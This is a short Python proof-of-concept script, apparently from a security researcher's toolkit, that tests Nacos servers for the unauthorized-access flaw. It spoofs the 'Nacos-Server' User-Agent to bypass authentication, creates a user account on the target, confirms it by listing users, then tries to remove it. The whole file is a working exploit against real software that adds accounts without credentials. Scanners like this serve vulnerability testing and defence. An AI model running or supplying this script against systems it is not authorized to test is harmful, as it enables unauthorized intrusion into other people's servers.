#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# author TeamsSix
# blog https://www.teamssix.com
# github https://github.com/teamssix

import sys
import requests
requests.packages.urllib3.disable_warnings()
headers = {'User-Agent': 'Nacos-Server'}

def check_vuln(url):
    url1 = url + '/v1/auth/users?username=foiyheiicmvczrzr&password=rvqwtgjvgxedtqhw'
    r1 = requests.post(url1,headers=headers,verify=False)
    if r1.status_code ==200 and 'create user ok!' in r1.text:
        url2 = url + '/v1/auth/users?pageNo=1&pageSize=999'
        r2 = requests.get(url2,headers=headers,verify=False)
        if r2.status_code==200 and 'foiyheiicmvczrzr' in r2.text:
            print('%s 存在 Nacos 未授权'%url)
            url3 = url + '/v1/auth/users?username=foiyheiicmvczrzr'
            r3 = requests.delete(url3,headers=headers,verify=False)
            if r3.status_code != 200 or 'delete user ok!' not in r3.text:
                print('请手动检查创建的foiyheiicmvczrzr用户是否删除')

    else:
        print('%s 不存在 Nacos 未授权'%url)


def main(url):
    r = requests.get(url, headers=headers)
    if r.status_code == 404 and '/nacos' not in url:
        url = url + '/nacos'
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            check_vuln(url)
        else:
            print('%s 目标访问 %s'%(url,r.status_code))
    else:
        check_vuln(url)


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip('/')
    except:
        print('python3 nacos-unauth.py example.com\neg: python3 nacos-unauth.py www.example.com')
        sys.exit()
    if 'http' not in url:
        url = 'http://' + url
    main(url)
